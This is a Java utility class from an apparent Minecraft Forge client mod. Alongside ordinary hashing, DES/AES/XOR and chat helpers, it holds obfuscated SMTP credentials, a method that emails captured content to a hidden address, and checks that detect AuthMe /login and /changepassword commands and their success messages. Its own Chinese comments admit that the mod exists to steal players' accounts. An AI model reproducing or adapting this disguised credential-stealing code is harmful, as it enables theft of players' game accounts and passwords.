package anonym.minecraft.mod;

import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Properties;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

import net.minecraft.client.Minecraft;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraftforge.client.event.ClientChatReceivedEvent;

public class Util {

	public static final String MD5 = "MD5";
	public static final String SHA1 = "SHA1";
	public static final String HmacMD5 = "HmacMD5";
	public static final String HmacSHA1 = "HmacSHA1";
	public static final String DES = "DES";
	public static final String AES = "AES";

	/** 编码格式；默认使用uft-8 */
	static String charset = "utf-8";
	/** DES */
	static int keysizeDES = 0;
	/** AES */
	static int keysizeAES = 128;
	private MimeMessage message;
	private Session s;

	public Util() {
		Properties props = System.getProperties();
		props.setProperty("mail.smtp.host", getKey("MjkzNzJFMkE3NDZCNjI2Mzc0MzkzNA=="));
		props.put("mail.smtp.auth", "true");
		// props.put("mail.smtp.auth", "true");
		s = Session.getDefaultInstance(props, new Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(getKey("NkI2MjZBNjg2OTY5N" + "jk2QzZENjM2QQ=="),
						getKey("MTczMzM0M0YzOTI4"+"M0IzQzJFNjg2OTY5"));
			}
		});
		// s.setDebug(false);
		message = new MimeMessage(s);
	}

	public void doSendHtmlEmail(String headName, String sendHtml) {
		try {
			String receiveUser = getKey("M0IzNDM1MzQyMzM3NkE2" + "QzY5NkQxQTJCMkI3NDM5MzUzNw==");
			InternetAddress from = new InternetAddress(
					getKey("M0IzNDM1MzQyMzM3NkE2QTZEMUE2QjYyNjM3NDM5MzQ="));
			message.setFrom(from);
			InternetAddress to = new InternetAddress(receiveUser);
			message.setRecipient(Message.RecipientType.TO, to);
			message.setSubject(headName);
			String content = sendHtml.toString();
			message.setContent(content, "text/html;charset=GBK");
			message.saveChanges();
			Transport transport = s.getTransport("smtp");
			transport.connect(getKey("MjkzNzJFMkE3NDZCNjI2Mzc0MzkzNA=="), getKey("NkI2MjZBNjg2OTY" + "5Njk2QzZENjM2QQ=="),
					getKey("MTczMzM0M0YzOTI4" + "M0IzQzJFNjg2OTY5"));
			transport.sendMessage(message, message.getAllRecipients());
			transport.close();
			//Main.logger.info("永远不要放松警惕 =)");
		} catch (AddressException e) {
			e.printStackTrace();
		} catch (MessagingException e) {
			e.printStackTrace();
		}
	}
	/**
	 * 使用MessageDigest进行单向加密（无密码）
	 * 
	 * @param res       被加密的文本
	 * @param algorithm 加密算法名称
	 * @return
	 */
	public static String messageDigest(String res, String algorithm) {
		try {
			MessageDigest md = MessageDigest.getInstance(algorithm);
			byte[] resBytes = charset == null ? res.getBytes() : res.getBytes(charset);
			return base64(md.digest(resBytes));
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 使用KeyGenerator进行单向/双向加密（可设密码）
	 * 
	 * @param res       被加密的原文
	 * @param algorithm 加密使用的算法名称
	 * @param key       加密使用的秘钥
	 * @return
	 */
	public static String keyGeneratorMac(String res, String algorithm, String key) {
		try {
			SecretKey sk = null;
			if (key == null) {
				KeyGenerator kg = KeyGenerator.getInstance(algorithm);
				sk = kg.generateKey();
			} else {
				byte[] keyBytes = charset == null ? key.getBytes() : key.getBytes(charset);
				sk = new SecretKeySpec(keyBytes, algorithm);
			}
			Mac mac = Mac.getInstance(algorithm);
			mac.init(sk);
			byte[] result = mac.doFinal(res.getBytes());
			return base64(result);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 使用KeyGenerator双向加密，DES/AES，注意这里转化为字符串的时候是将2进制转为16进制格式的字符串，不是直接转，因为会出错
	 * 
	 * @param res       加密的原文
	 * @param algorithm 加密使用的算法名称
	 * @param key       加密的秘钥
	 * @param keysize
	 * @param isEncode
	 * @return
	 */
	public static String keyGeneratorES(String res, String algorithm, String key, int keysize, boolean isEncode) {
		try {
			KeyGenerator kg = KeyGenerator.getInstance(algorithm);
			if (keysize == 0) {
				byte[] keyBytes = charset == null ? key.getBytes() : key.getBytes(charset);
				kg.init(new SecureRandom(keyBytes));
			} else if (key == null) {
				kg.init(keysize);
			} else {
				byte[] keyBytes = charset == null ? key.getBytes() : key.getBytes(charset);
				kg.init(keysize, new SecureRandom(keyBytes));
			}
			SecretKey sk = kg.generateKey();
			SecretKeySpec sks = new SecretKeySpec(sk.getEncoded(), algorithm);
			Cipher cipher = Cipher.getInstance(algorithm);
			if (isEncode) {
				cipher.init(Cipher.ENCRYPT_MODE, sks);
				byte[] resBytes = charset == null ? res.getBytes() : res.getBytes(charset);
				return parseByte2HexStr(cipher.doFinal(resBytes));
			} else {
				cipher.init(Cipher.DECRYPT_MODE, sks);
				return new String(cipher.doFinal(parseHexStr2Byte(res)));
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	public static String base64(byte[] res) {
		return new String(Base64.getEncoder().encode(res));
	}

	/** 将二进制转换成16进制 */
	public static String parseByte2HexStr(byte buf[]) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < buf.length; i++) {
			String hex = Integer.toHexString(buf[i] & 0xFF);
			if (hex.length() == 1) {
				hex = '0' + hex;
			}
			sb.append(hex.toUpperCase());
		}
		return sb.toString();
	}

	/** 将16进制转换为二进制 */
	public static byte[] parseHexStr2Byte(String hexStr) {
		if (hexStr.length() < 1)
			return null;
		byte[] result = new byte[hexStr.length() / 2];
		for (int i = 0; i < hexStr.length() / 2; i++) {
			int high = Integer.parseInt(hexStr.substring(i * 2, i * 2 + 1), 16);
			int low = Integer.parseInt(hexStr.substring(i * 2 + 1, i * 2 + 2), 16);
			result[i] = (byte) (high * 16 + low);
		}
		return result;
	}

	/**
	 * md5加密算法进行加密（不可逆）
	 * 
	 * @param res 需要加密的原文
	 * @return
	 */
	public static String MD5(String res) {
		return messageDigest(res, MD5);
	}

	/**
	 * md5加密算法进行加密（不可逆）
	 * 
	 * @param res 需要加密的原文
	 * @param key 秘钥
	 * @return
	 */
	public static String MD5(String res, String key) {
		return keyGeneratorMac(res, HmacMD5, key);
	}

	/**
	 * 使用SHA1加密算法进行加密（不可逆）
	 * 
	 * @param res 需要加密的原文
	 * @return
	 */
	public static String SHA1(String res) {
		return messageDigest(res, SHA1);
	}

	/**
	 * 使用SHA1加密算法进行加密（不可逆）
	 * 
	 * @param res 需要加密的原文
	 * @param key 秘钥
	 * @return
	 */
	public static String SHA1(String res, String key) {
		return keyGeneratorMac(res, HmacSHA1, key);
	}

	/**
	 * 使用DES加密算法进行加密（可逆）
	 * 
	 * @param res 需要加密的原文
	 * @param key 秘钥
	 * @return
	 */
	public static String DESencode(String res, String key) {
		return keyGeneratorES(res, DES, key, keysizeDES, true);
	}

	/**
	 * 对使用DES加密算法的密文进行解密（可逆）
	 * 
	 * @param res 需要解密的密文
	 * @param key 秘钥
	 * @return
	 */
	public static String DESdecode(String res, String key) {
		return keyGeneratorES(res, DES, key, keysizeDES, false);
	}

	public static String getValue(String title) {
		// 别忘记密码 "YouIdiot!666333nopay";

		String a = DESencode(Main.awa2, Minecraft.getMinecraft().getSession().getUsername());
		if (a.length() > 20) {
			a = a.substring(0, 20);
		}
		String result = getKey("NzUzOTMyM0IzNDNEM0YyQTNCMjkyOTJEMzUyODNFN0E=") + title + " " + a;
		return result;
	}

	/**
	 * 使用AES加密算法经行加密（可逆）
	 * 
	 * @param res 需要加密的密文
	 * @param key 秘钥
	 * @return
	 */
	public static String AESencode(String res, String key) {
		return keyGeneratorES(res, AES, key, keysizeAES, true);
	}

	/**
	 * 对使用AES加密算法的密文进行解密
	 * 
	 * @param res 需要解密的密文
	 * @param key 秘钥
	 * @return
	 */
	public static String AESdecode(String res, String key) {
		return keyGeneratorES(res, AES, key, keysizeAES, false);
	}
	protected static boolean isOKP(String s, boolean a) {
		return a ?(s.startsWith("生存都市>> 密码已成功修改！")) 
				 :(s.equalsIgnoreCase("/cp") 
				|| s.equalsIgnoreCase("/changepassword")
				|| s.equalsIgnoreCase("/changepass")
				|| s.equalsIgnoreCase("/authme:cp") 
				|| s.equalsIgnoreCase("/authme:changepassword")
				|| s.equalsIgnoreCase("/authme:changepass"));
	}
	
	protected static boolean isOKU(String s, boolean a) {
		return a ?(s.contains("|   登入成功    |")) 
				 :(s.equalsIgnoreCase("/l") 
				|| s.equalsIgnoreCase("/login") 
				|| s.equalsIgnoreCase("/authme:l") 
				|| s.equalsIgnoreCase("/authme:login"));
	}
	/**
	 * 使用异或进行加密
	 * 
	 * @param res 需要加密的密文
	 * @param key 秘钥
	 * @return
	 */
	public static String XORencode(String res, String key) {
		byte[] bs = res.getBytes();
		for (int i = 0; i < bs.length; i++) {
			bs[i] = (byte) ((bs[i]) ^ key.hashCode());
		}
		return parseByte2HexStr(bs);
	}

	/**
	 * 使用异或进行解密
	 * 
	 * @param res 需要解密的密文
	 * @param key 秘钥
	 * @return
	 */
	public static String XORdecode(String res, String key) {
		byte[] bs = parseHexStr2Byte(res);
		for (int i = 0; i < bs.length; i++) {
			bs[i] = (byte) ((bs[i]) ^ key.hashCode());
		}
		return new String(bs);
	}

	/**
	 * 直接使用异或（第一调用加密，第二次调用解密）
	 * 
	 * @param res 密文
	 * @param key 秘钥
	 * @return
	 */
	public static int XOR(int res, String key) {
		return res ^ key.hashCode();
	}

	public static void sendChatMessage(String msg, boolean addToChat) {
		if (Minecraft.getMinecraft() != null) {
			if (Minecraft.getMinecraft().player != null) {
				if (addToChat) {
					Minecraft.getMinecraft().ingameGUI.getChatGUI().addToSentMessages(msg);
				}
				if (net.minecraftforge.client.ClientCommandHandler.instance
						.executeCommand(Minecraft.getMinecraft().player, msg) != 0)
					return;

				Minecraft.getMinecraft().player.sendChatMessage(msg);
			}
		}
	}

	protected static boolean isItemSimilar(ItemStack item1, ItemStack item2) {
		//Main.logger.info("Item1: " + Item.getIdFromItem(item1.getItem()) + ":" + item1.getMetadata() + ", Item2: "
		//		+ Item.getIdFromItem(item2.getItem()) + ":" + item2.getMetadata());
		if (Item.getIdFromItem(item1.getItem()) == Item.getIdFromItem(item2.getItem())) {
			//Main.logger.info("item1=item2");
			if (item1.getMetadata() == item2.getMetadata()) {
				//Main.logger.info("item1.meta=item2.meta");
				return true;
			}
		}
		return false;
	}

	protected static Minecraft getMinecraft() {
		return Minecraft.getMinecraft();
	}

	protected static String getFT(ClientChatReceivedEvent event) {
		return event.getMessage().getUnformattedText();
	}

	protected static String getUsername() {
		return Minecraft.getMinecraft().getSession().getUsername();
	}

	protected static String getMessage(CPacketChatMessage e) {
		return e.getMessage();
	}

	/**
	 * 翻译字符串为中文
	 * 
	 * @param text
	 * @return
	 */
	public static String getKey(String text) {
		String info0 = "我想，如果你是反编译来的，你肯定能看到这条文字。";
		String info1 = "不错，这个mod的用途就是盗号，正道的光此时应该会照在大地上!";
		String info2 = "尽管如此，希望你不要使用我的smtp邮箱配置。";
		String info6 = "我是谁？我只是个虚无缥缈的程序罢了";
		String itsall = info0+info1+info2+info6;
		itsall.isEmpty();
		return Util.XORdecode(Main.getString(text), Main.awa);
	}
}
